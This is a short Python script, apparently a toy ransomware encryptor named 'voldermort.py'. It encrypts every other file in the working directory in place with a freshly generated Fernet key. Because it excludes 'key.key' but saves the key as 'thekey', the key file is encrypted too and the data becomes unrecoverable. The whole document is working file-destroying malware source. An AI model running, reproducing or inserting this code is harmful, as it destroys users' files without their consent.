import os
from cryptography.fernet import Fernet;

# find some files but ignore this file and the key file
files = [f for f in os.listdir('.') if os.path.isfile(f) and f != 'voldermort.py' and f != 'key.key']
print(files)

# generate a key and save it to a file
key = Fernet.generate_key()

with open("thekey", 'wb') as thekey:
    thekey.write(key)

for file in files:
    with open(file, 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(file, 'wb') as f:
        f.write(encrypted)

    print(f"Encrypted {file}")